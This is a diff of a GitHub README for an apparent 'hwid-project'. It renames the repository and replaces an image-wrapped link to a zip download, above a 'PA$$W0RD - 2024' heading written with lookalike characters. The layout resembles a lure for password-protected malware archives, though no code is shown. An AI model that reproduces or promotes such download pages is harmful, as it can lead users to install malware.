@@ -1,10 +1,10 @@
-# reimagined-guacamole
+# hwid-project
 
 > [!TIP]
 > ***How to download:***
 
 
-![1222](https://github.com/user-attachments/assets/bd2d9fc9-27ec-4e85-a748-a4c6dd4c50f7)](https://github.com/intkdd/hwid-project/archive/refs/heads/main.zip) 
+[![p](https://github.com/user-attachments/assets/b570182b-fbaa-47a4-88c3-e83b1c739171)](https://github.com/intkdd/hwid-project/archive/refs/heads/main.zip) 
 
 
 ## РА$$W0RD - 2024
